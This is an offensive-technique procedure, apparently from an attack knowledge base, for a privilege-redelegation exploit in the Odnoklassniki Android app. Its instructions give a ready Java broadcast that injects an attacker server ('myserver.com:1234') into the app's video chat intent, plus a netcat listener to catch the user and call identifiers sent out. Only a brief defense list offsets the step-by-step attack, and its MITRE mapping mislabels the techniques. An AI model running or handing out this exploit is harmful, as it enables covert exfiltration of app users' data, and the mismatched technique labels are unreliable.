---
tags:
  - android
  - privilege-redelegation
  - data-exfiltration
type: procedure
tools: []
tactics:
  - '[[Command and Control]]'
commands:
  - '[[commands/trigger-video-chat-redelegation]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Cloud Service Discovery]]'
updated_at: '2025-12-14T17:24:42.370Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: f99ede36-5da5-4607-9a44-f21460a7e5fa
validated: true
mitre_tactics:
  - '[[Command and Control]]'
mitre_techniques:
  - '[[Cloud Service Discovery]]'
---
# Privilege Redelegation for Arbitrary HTTP Requests

## Summary

This procedure exploits the video chat controller in Odnoklassniki by injecting an attacker-controlled server address via intent extras, causing the app to send HTTP requests to it and enabling data exfiltration without the malicious app holding the INTERNET permission.

## Description

The VideochatController uses an unvalidated 'server' extra from the intent to build HTTP URIs. By broadcasting a spoofed intent with 'vchat' key and fake server, the controller constructs and sends requests (e.g., GET /api-get-signal) including signed params like uid and cid. This redelegates the app's INTERNET privilege for attacker benefit, potentially leaking device/user data.

## Requirements

1. Android device with Odnoklassniki installed
2. Malicious app able to send broadcasts
3. Attacker server listening on specified port (e.g., 1234)

## Defense

Defensive measures and detection strategies:

- Validate and whitelist server addresses from intents
- Use HTTPS and certificate pinning for requests
- Monitor outgoing HTTP traffic for anomalous domains/ports

## Objectives

1. Inject fake server into video chat intent
2. Trigger HTTP request from Odnoklassniki
3. Receive exfiltrated data on attacker server

## Instructions

### Step 1: Broadcast Redelegation Intent

**Context**: Send intent to NotifyReceiver with video chat extras, overriding server.

**Command** ([[commands/trigger-video-chat-redelegation]]):
```java
Intent m = new Intent(); m.setAction("ru.ok.android.action.NOTIFY"); m.putExtra("key", "vchat"); m.putExtra("cid", "c60b0e06695a4ce896261247b43f772b"); m.putExtra("caller_name", "Fake User"); m.putExtra("server", "myserver.com:1234"); getActivity().sendBroadcast(m);
```

> Sets action, adds vchat key, call ID, fake name, and attacker server. Expected output: App sends HTTP to myserver.com:1234/api-get-signal with params.

### Step 2: Capture Exfiltrated Data

**Context**: On attacker server, log incoming requests.

**Command** (Server-side, e.g., nc -l 1234):
```bash
nc -l 1234
```

> Success: Request received with uid, cid, client details.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control]] Command and Control

### Techniques

- [[Cloud Service Discovery]] Introduce Dependencies

### Sub-Techniques

-

## Commands Used

- [[commands/trigger-video-chat-redelegation]]

## Tools Used

-

## Tags

- android
- privilege-redelegation
- data-exfiltration
